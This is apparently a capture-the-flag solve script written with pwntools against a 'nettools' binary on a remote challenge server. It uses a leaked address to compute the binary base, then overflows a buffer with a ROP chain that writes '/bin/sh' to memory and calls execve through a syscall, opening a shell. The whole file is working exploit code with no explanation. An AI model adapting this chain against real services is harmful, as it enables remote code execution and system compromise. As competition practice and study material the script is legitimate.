from pwn import *
context(arch='amd64', os='linux')
e = ELF('./nettools')
#r = process('./nettools')
r = remote('chals.sekai.team', 4001)
r.recvuntil(b': ')
leak = int(r.recvline().decode().strip()[2:], 16)
e.address = leak - e.symbols['_ZN8nettools6CHOICE17h0d0daa1684b4400fE']
r.sendline(b'3')
payload = bytearray(b'a'*(0x348-0x60))
payload[400-1] = 0x0 # make sure counted length doesn't go over 400
rop = ROP(e)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
mov_rdx = e.address+0x000000000005f28e # for some reason it can't auto find this?
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
write_mem = e.address+0x0000000000056d37 # this one glitches too for some reason
syscall = rop.find_gadget(['syscall'])[0]
payload += p64(pop_rsi) + b'/bin/sh\x00' + p64(pop_rax) + p64(e.bss(0x00) - 10 - 6) + p64(write_mem)
payload += p64(pop_rax) + p64(0x3b) + p64(pop_rdi) + p64(e.bss(0x00)) + p64(pop_rsi) + p64(0) + p64(mov_rdx) 
payload += p64(syscall)
r.sendline(payload)
r.interactive()

